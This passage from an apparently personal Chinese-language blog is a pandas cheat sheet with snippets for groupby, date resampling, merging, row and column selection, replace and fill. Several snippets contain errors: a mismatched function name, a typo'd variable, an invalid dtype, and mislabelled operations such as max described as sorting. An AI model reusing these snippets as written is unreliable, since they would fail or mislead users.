class="string">&#x27;AAPL&#x27;</span>, [<span class="string">&#x27;SPX&#x27;</span>])</span><br></pre></td></tr></table></figure></li><li><p>groupby后的apply</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 数据是tg_id,month,q1-q96,求每个月q1-q96中最大的点</span></span><br><span class="line"><span class="comment"># 法1</span></span><br><span class="line">df.groupby([<span class="string">&#x27;tg_id&#x27;</span>,<span class="string">&#x27;month&#x27;</span>]).apply(<span class="keyword">lambda</span> x:<span class="built_in">max</span>(x.drop([<span class="string">&#x27;tg_id&#x27;</span>,<span class="string">&#x27;month&#x27;</span>],axis=<span class="number">1</span>).apply(<span class="keyword">lambda</span> x:<span class="built_in">max</span>(x))))</span><br><span class="line"><span class="comment"># 法 2</span></span><br><span class="line">df.groupby([<span class="string">&#x27;tg_id&#x27;</span>,<span class="string">&#x27;month&#x27;</span>]).apply(<span class="keyword">lambda</span> x:x.drop([<span class="string">&#x27;tg_id&#x27;</span>,<span class="string">&#x27;month&#x27;</span>],axis=<span class="number">1</span>).apply(<span class="keyword">lambda</span> x:<span class="built_in">max</span>(x,axis=<span class="number">1</span>))).reset_index().groupby([<span class="string">&#x27;tg_id&#x27;</span>,<span class="string">&#x27;month&#x27;</span>]).apply(<span class="keyword">lambda</span> x:x.drop([<span class="string">&#x27;tg_id&#x27;</span>,<span class="string">&#x27;month&#x27;</span>],axis=<span class="number">1</span>).apply(<span class="keyword">lambda</span> x:<span class="built_in">max</span>(x)))</span><br><span class="line"><span class="comment"># 法3</span></span><br><span class="line">val = [<span class="string">f&#x27;p<span class="subst">&#123;i&#125;</span>&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">97</span>)]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cal_min</span>(<span class="params">df</span>):</span><br><span class="line">  <span class="keyword">return</span> df[val].<span class="built_in">min</span>().<span class="built_in">min</span>()</span><br><span class="line">q4.groupby([<span class="string">&#x27;tg_id&#x27;</span>,<span class="string">&#x27;month&#x27;</span>]).apply(cal_max)</span><br><span class="line"><span class="comment"># 法4</span></span><br><span class="line">q4.groupby([<span class="string">&#x27;tg_id&#x27;</span>,<span class="string">&#x27;month&#x27;</span>]).apply(<span class="keyword">lambda</span> x:x[val].<span class="built_in">max</span>().<span class="built_in">max</span>())</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>将含有空白符的列转float</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.a.replace(<span class="string">r&#x27;^\s*$&#x27;</span>, np.nan, regex=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></li></ul><h2><span id="日期">日期</span></h2><ul><li>将日的数据转为以月为统计的数据</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 提取日期中的date</span></span><br><span class="line">df[<span class="string">&#x27;date&#x27;</span>].dt.date</span><br><span class="line"><span class="comment"># 重采样 统计</span></span><br><span class="line">df.resample(<span class="string">&#x27;D&#x27;</span>).count()</span><br><span class="line"><span class="comment">#重采样 逐个显示</span></span><br><span class="line">df.to_period(<span class="string">&quot;M&quot;</span>)</span><br><span class="line"><span class="comment"># 异形日期转换</span></span><br><span class="line">pd.to_datetime(work_index[<span class="string">&#x27;日期&#x27;</span>],<span class="built_in">format</span>=<span class="string">&#x27;%Y%m%d&#x27;</span>)</span><br><span class="line"><span class="comment"># 选择日期范围</span></span><br><span class="line">bz = [<span class="string">&#x27;2022-2-14&#x27;</span>,<span class="string">&#x27;2022-2-20&#x27;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="crud">CRUD</span></h2><p>一般来说pandas操作都不会在原dataframe进行修改，通过inplace&#x3D;True可以实现就地修改。</p><h4><span id="列操作">列操作</span></h4>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重命名特定列名</span></span><br><span class="line">df.rename(columns=&#123;<span class="string">&#x27;A&#x27;</span>:<span class="string">&#x27;a&#x27;</span>&#125;,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 重命名所有列名</span></span><br><span class="line">df.columns = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="comment"># 取出特定类型的列名</span></span><br><span class="line">obj_feature=df.dtypes[df.dtypes==<span class="string">&#x27;object&#x27;</span>].index</span><br><span class="line"><span class="comment"># 更新列的类型</span></span><br><span class="line">df[<span class="string">&#x27;金牌数&#x27;</span>] = df[<span class="string">&#x27;金牌数&#x27;</span>].astype(<span class="built_in">int</span>)</span><br><span class="line"><span class="comment"># 插入list</span></span><br><span class="line">df.a = df.a.astype(<span class="string">&#x27;list&#x27;</span>)</span><br><span class="line">df.iat[i,-<span class="number">1</span>] = <span class="built_in">list</span>(xxx)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">li</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 连接两个列</span></span><br><span class="line">df = pd.concat([tmp1,tmp3.to_frame(),tmp2],axis=<span class="number">1</span>,ignore_index=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只取结果的交集</span></span><br><span class="line">pd.concat([df1,df4],axis=<span class="number">1</span>,join=<span class="string">&#x27;inner&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只取包含 df1 索引的部分</span></span><br><span class="line">pd.concat([df1, df4], axis=<span class="number">1</span>).reindex(df1.index)</span><br><span class="line">pd.merge(df1,df4,left_index=<span class="literal">True</span>,right_index=<span class="literal">True</span>,how=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 新增列</span></span><br><span class="line">df[<span class="string">&#x27;new col name&#x27;</span>]=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 插入列</span></span><br><span class="line">tmp3 = (df[<span class="string">&#x27;春节期间（除夕至初六）用电量&#x27;</span>]-df[<span class="string">&#x27;节前温度接近的一周用电量&#x27;</span>])/df[<span class="string">&#x27;节前温度接近的一周用电量&#x27;</span>]</span><br><span class="line">tmp1 = df.iloc[:,:<span class="number">1</span>]</span><br><span class="line">tmp2 = df.iloc[:,<span class="number">1</span>:]</span><br><span class="line">df = pd.concat([tmp1,tmp3.to_frame(),tmp2],axis=<span class="number">1</span>,ignore_index=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 删除 df 的 7、8、9、10 列</span></span><br><span class="line">df.drop(df.columns[[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]], axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 提取第1，2，3，4列</span></span><br><span class="line">df.iloc[:,<span class="number">0</span>:<span class="number">4</span>] </span><br><span class="line">df.iloc[:,[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]]</span><br><span class="line"><span class="comment"># 提取 金牌数、银牌数、铜牌数 三列</span></span><br><span class="line">df[[<span class="string">&#x27;金牌数&#x27;</span>,<span class="string">&#x27;银牌数&#x27;</span>,<span class="string">&#x27;铜牌数&#x27;</span>]]</span><br><span class="line"><span class="comment"># 提取全部列名中以 “数” 结尾的列</span></span><br><span class="line">df.loc[:, df.columns.<span class="built_in">str</span>.endswith(<span class="string">&#x27;数&#x27;</span>)]</span><br><span class="line"><span class="comment"># 改变列顺序</span></span><br><span class="line">df = df[[<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>]]</span><br><span class="line"><span class="comment"># 单一一列提前可以</span></span><br><span class="line">df.set_index(<span class="string">&#x27;a&#x27;</span>).reset_index()</span><br><span class="line"><span class="comment"># 按列排序</span></span><br><span class="line">df.<span class="built_in">max</span>(axis=<span class="number">1</span>)</span><br><span class="line"><span class="comment">#or</span></span><br><span class="line">df.<span class="built_in">max</span>(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 统计出现最多的</span></span><br><span class="line">tmp2 =df.groupby([<span class="string">&#x27;genreId&#x27;</span>]).agg(<span class="keyword">lambda</span> x:x.mode())</span><br><span class="line"><span class="comment"># 方法二</span></span><br><span class="line">df.groupby([<span class="string">&#x27;genreId&#x27;</span>,<span class="string">&#x27;contentRating&#x27;</span>]).count()[[<span class="string">&#x27;id&#x27;</span>]].idxmax(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="行操作">行操作</span></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">拼接行</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看含有空值的行</span></span><br><span class="line">df[df.isna().T.<span class="built_in">any</span>()]</span><br><span class="line"><span class="comment"># 连接两个df</span></span><br><span class="line">pd.concat([train,val],ignore_index=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">df = pd.concat([train,val]).reset_index()</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">train.append(val).reset_index()</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">train.append(val,ignore_index=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据 key 连接 left 和 right</span></span><br><span class="line">pd.merge(left, right, on=<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line"><span class="comment"># 根据 key1 和 key2 连接 left 和 right</span></span><br><span class="line">pd.merge(left, right, on=[<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>])</span><br><span class="line"><span class="comment"># 根据left的key列和right的index合并</span></span><br><span class="line">pd.merge(left1, right1, left_on=<span class="string">&#x27;key&#x27;</span>, right_index=<span class="literal">True</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">how 可以设置</span></span><br><span class="line"><span class="string">right、left: 左外，右外</span></span><br><span class="line"><span class="string">outer、inner: 全外连接，内连接</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pd.merge(left, right, how=<span class="string">&#x27;left&#x27;</span>, on=[<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>])</span><br><span class="line"><span class="comment"># 重新产生数据</span></span><br><span class="line">left.join(right, on=[<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拼接 df1、df2、df3，同时新增一个索引（x、y、z）来区分不同的表数据来源</span></span><br><span class="line">pd.concat([df1, df2, df3], keys=[<span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 插入行</span></span><br><span class="line">df = pd.DataFrame(&#123;<span class="string">&#x27;A&#x27;</span>:[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>],<span class="string">&#x27;B&#x27;</span>:[<span class="number">2</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span>]&#125;)</span><br><span class="line">c = pd.DataFrame(&#123;<span class="string">&#x27;A&#x27;</span>:[<span class="number">5</span>],<span class="string">&#x27;B&#x27;</span>:[<span class="number">5</span>]&#125;)</span><br><span class="line">a = df.iloc[:<span class="number">2</span>,:]</span><br><span class="line">b = df.iloc[<span class="number">2</span>:,:]</span><br><span class="line">df = pd.concat([a,c,b])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除第一行</span></span><br><span class="line">df.drop(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 条件删除</span></span><br><span class="line">df.drop(df[df.金牌数&lt;<span class="number">20</span>].index)</span><br><span class="line">data =  data.drop(index = data[(data.ZH_Term_len == <span class="number">0</span>)].index.tolist())</span><br><span class="line"><span class="comment"># 提取倒数后三列的10-20行</span></span><br><span class="line">df.iloc[<span class="number">10</span>:<span class="number">20</span>,-<span class="number">3</span>:]</span><br><span class="line">df.loc[<span class="number">10</span>:<span class="number">20</span>, <span class="string">&#x27;总分&#x27;</span>:] </span><br><span class="line"><span class="comment"># 提取第 10 行 </span></span><br><span class="line"><span class="comment"># DataFrame格式</span></span><br><span class="line">a = df.loc[<span class="number">9</span>:<span class="number">9</span>]</span><br><span class="line"><span class="comment"># Series格式</span></span><br><span class="line">a = df.loc[<span class="number">9</span>,:]</span><br><span class="line"><span class="comment"># 提取第 10 行之后的全部行</span></span><br><span class="line">df.iloc[<span class="number">9</span>:,]</span><br><span class="line">df.iloc[<span class="number">9</span>:]</span><br><span class="line"><span class="comment"># 提取 0-50 行，间隔为 3</span></span><br><span class="line">df[:<span class="number">50</span>:<span class="number">3</span>]</span><br><span class="line"><span class="comment"># 提取 金牌数 不等于 10 的行</span></span><br><span class="line">df.loc[~(df[<span class="string">&#x27;金牌数&#x27;</span>] == <span class="number">10</span>)]</span><br><span class="line"><span class="comment"># 提取奇数行</span></span><br><span class="line">df[[i%<span class="number">2</span>==<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(df.index))]]</span><br><span class="line"><span class="comment"># 提取 中国、美国、英国、日本、巴西 五行数据 且 金牌数小于30</span></span><br><span class="line">df.loc[(df[<span class="string">&#x27;金牌数&#x27;</span>] &lt; <span class="number">30</span>) &amp; (df[<span class="string">&#x27;国家奥委会&#x27;</span>].isin([<span class="string">&#x27;中国&#x27;</span>,<span class="string">&#x27;美国&#x27;</span>,<span class="string">&#x27;英国&#x27;</span>,<span class="string">&#x27;日本&#x27;</span>,<span class="string">&#x27;巴西&#x27;</span>]))]</span><br><span class="line"><span class="comment"># 包含某个字的行</span></span><br><span class="line">df[df.国家奥委会.<span class="built_in">str</span>.contains(<span class="string">&#x27;国&#x27;</span>)]</span><br><span class="line"><span class="comment"># 提取 第 0-2 行第 0-2 列</span></span><br><span class="line">df.iloc[<span class="number">0</span>:<span class="number">2</span>,<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">df.iloc[<span class="number">0</span>:<span class="number">2</span>,[<span class="number">0</span>,<span class="number">1</span>]]</span><br><span class="line"><span class="comment"># 使用 query 提取 金牌数 + 银牌数 大于 15 的国家</span></span><br><span class="line">df.query(<span class="string">&#x27;金牌数+银牌数 &gt; 15&#x27;</span>)</span><br><span class="line"><span class="comment"># 使用 query 提取 金牌数 大于 金牌均值的国家</span></span><br><span class="line">gold_mean = df[<span class="string">&#x27;金牌数&#x27;</span>].mean()</span><br><span class="line">df.query(<span class="string">f&#x27;金牌数 &gt; <span class="subst">&#123;gold_mean&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># 指定位置插入行</span></span><br><span class="line">df1 = df.iloc[:<span class="number">1</span>, :]</span><br><span class="line">df2 = df.iloc[<span class="number">1</span>:, :]</span><br><span class="line">df3 = pd.DataFrame([[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(df.columns))]], columns=df.columns)</span><br><span class="line">df_new = pd.concat([df1, df3, df2], ignore_index=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 调整 顺序</span></span><br><span class="line">q4_df = q4_df.reindex([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">22</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>]).reset_index()</span><br><span class="line"><span class="comment"># 可以调整列的顺序</span></span><br><span class="line">ans.reindex([<span class="string">&#x27;installs总数&#x27;</span>,<span class="string">&#x27;contentRating最多的类型&#x27;</span>,<span class="string">&#x27;contentRating最多类型百分比&#x27;</span>,<span class="string">&#x27;score平均分&#x27;</span>],axis=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 换顺序</span></span><br><span class="line">cpn_bz.iloc[[<span class="number">2</span>,<span class="number">3</span>]]=cpn_bz.iloc[[<span class="number">3</span>,<span class="number">2</span>]]</span><br></pre></td></tr></table></figure><h3><span id="create">Create</span></h3><ul><li>创建DataFrame</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 list 生成</span></span><br><span class="line">nums = np.array([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">31</span>)]).reshape(<span class="number">10</span>,<span class="number">3</span>)</span><br><span class="line">colu = [<span class="string">f&#x27;col_<span class="subst">&#123;i&#125;</span>&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">inde = [<span class="string">f&#x27;row_<span class="subst">&#123;i&#125;</span>&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]  </span><br><span class="line">pd.DataFrame(data=nums,index=Finde,columns=colu)</span><br><span class="line"><span class="comment"># 使用 dict 生成，索引自动生成</span></span><br><span class="line">hight = np.random.randint(<span class="number">158</span>,<span class="number">180</span>,<span class="number">10</span>)</span><br><span class="line">weight = np.random.randint(<span class="number">49</span>,<span class="number">75</span>,<span class="number">10</span>)</span><br><span class="line">pd.DataFrame(data=&#123;</span><br><span class="line">    <span class="string">&#x27;hight&#x27;</span>:hight,</span><br><span class="line">    <span class="string">&#x27;weight&#x27;</span>:weight,&#125;</span><br><span class="line">)      <span class="comment"># 这里没有设置索引，会自动生成</span></span><br><span class="line"><span class="comment"># 读取excel sheet_name默认是0，传入数字就是读取第x+1个sheet，传入字符串就是查找对于sheet的名字</span></span><br><span class="line">df = pd.read_excel(<span class="string">&#x27;data/2020年销售数据.xlsx&#x27;</span>,sheet_name=<span class="number">0</span>) </span><br><span class="line"><span class="comment"># 读取csv文件，默认编码utf-8，遇到中文乱码可以试试看gbk</span></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;data/2018年北京积分落户数据.csv&#x27;</span>,encoding=<span class="string">&#x27;gbk&#x27;</span>)  <span class="comment"># encoding参数指定数据的编码方式为utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="del">Del</span></h3><ul><li><p>删除某列的数据</p><ul><li><strong>axis</strong>：轴。0 或 ‘index’，表示按行删除；1或’columns’，表示按列删除。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># del 只能删一行</span></span><br><span class="line"><span class="keyword">del</span> df[<span class="string">&#x27;a&#x27;</span>]</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">df.drop(<span class="string">&#x27;a&#x27;</span>,axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></li></ul><h3><span id="update">Update</span></h3><ul><li>where操作</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果一个国家的金牌数大于 30 则值为 是，反之为 否</span></span><br><span class="line">df[<span class="string">&#x27;金牌大于30&#x27;</span>]  = np.where(df[<span class="string">&#x27;金牌数&#x27;</span>] &gt; <span class="number">30</span>, <span class="string">&#x27;是&#x27;</span>, <span class="string">&#x27;否&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>更新索引</li></ul>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 索引从1开始</span></span><br><span class="line">df.set_index(x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,df.shape[<span class="number">0</span>]+<span class="number">1</span>))</span><br><span class="line"><span class="comment"># 使用某列作为索引，默认删除该列 即drop=True</span></span><br><span class="line">df.set_index(<span class="string">&#x27;date&#x27;</span>)</span><br><span class="line"><span class="comment"># 修改索引名 如果是多个索引可以通过[]传入</span></span><br><span class="line">df.rename_axis(<span class="string">&#x27;日期&#x27;</span>)</span><br><span class="line"><span class="comment"># 指定多个索引</span></span><br><span class="line">df=df.set_index([<span class="string">&#x27;date&#x27;</span>,<span class="string">&#x27;val&#x27;</span>])</span><br><span class="line"><span class="comment"># 修改单个索引名</span></span><br><span class="line">df.rename_axis(index=&#123;<span class="string">&#x27;val&#x27;</span>:<span class="string">&#x27;v&#x27;</span>&#125;)</span><br><span class="line"><span class="comment"># 还原索引，使用pandas生成默认索引</span></span><br><span class="line">df.reset_index()</span><br><span class="line"><span class="comment"># 删除索引</span></span><br><span class="line">df.reset_index(drop=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><ul><li>replace</li></ul>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将金牌数列的数字 0 替换为 无</span></span><br><span class="line">df[<span class="string">&#x27;金牌数&#x27;</span>].replace(<span class="number">0</span>,<span class="string">&#x27;无&#x27;</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#同时替换 1将 无 替换为 缺失值 2将 0 替换为 None</span></span><br><span class="line">df.replace([<span class="string">&#x27;无&#x27;</span>,<span class="number">0</span>],[np.nan,<span class="string">&#x27;None&#x27;</span>],inplace = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Series中replace字符串部分需要加上.str. 支持链式编程</span></span><br><span class="line">df.employmentLength.<span class="built_in">str</span>.replace(<span class="string">&#x27;years&#x27;</span>,<span class="string">&#x27;&#x27;</span>).<span class="built_in">str</span>.replace(<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># lambda 和 str</span></span><br><span class="line">df.price = df.price.<span class="built_in">str</span>.replace(<span class="string">&#x27;[$|,]&#x27;</span>,<span class="string">&#x27;&#x27;</span>).astype(<span class="string">&#x27;float&#x27;</span>)</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">df.price = df.price.apply(<span class="keyword">lambda</span> x:x.replace(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;&#x27;</span>)).astype(<span class="string">&#x27;float&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>fill</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">bfill 从后面往前填充</span></span><br><span class="line"><span class="string">ffill 从前往后</span></span><br><span class="line"><span class="string">默认列方向填充0，1使用行方向</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 新增一列 最多奖牌数量 列，值为该国 金、银、铜 牌数量中最多的一个奖牌数量</span></span><br><span class="line">df[<span class="string">&#x27;最多奖牌数量&#x27;</span>] = df.bfill(<span class="number">1</span>)[[<span class="string">&quot;金牌数&quot;</span>, <span class="string">&quot;银牌数&quot;</span>,<span class="string">&#x27;铜牌数&#x27;</span>]].<span class="built_in">max</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>- </p><h3><span id="retrieve">Retrieve</span></h3><ul><li>随机返回n个样本</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.sample(n)</span><br></pre></td></tr></table></figure><ul><li>pivot与groupby</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 